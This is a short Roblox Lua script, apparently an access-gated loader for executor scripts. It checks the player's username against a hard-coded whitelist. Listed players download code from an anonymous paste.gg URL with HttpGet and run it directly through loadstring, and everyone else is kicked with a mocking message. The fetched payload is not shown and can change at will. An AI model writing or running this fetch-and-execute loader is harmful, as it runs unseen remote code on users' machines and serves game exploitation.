-- gr1u updated whitelist

local WhitelistedUsernames = {
    ["Dragonblox836"] = true,
    ["torsotapper"] = true,
    ["widebodymhki"] = true,
    ["SoftX_ff"] = true,
    ["Dragonblox836"] = true
    
}

local Player = game.Players.LocalPlayer

local function isWhitelisted(player)
    local username = player.Name
    return WhitelistedUsernames[username] == true
end

if isWhitelisted(Player) then
    loadstring(game:HttpGet("https://paste.gg/p/anonymous/ec746110a98147efaefe0dd955e38264/files/65275454bab040e7a396cb4f19ca31f9/raw"))()
else
    game.Players.LocalPlayer:Kick("BlackListed - Restless.dreams DOESNT fwu😂.")
end
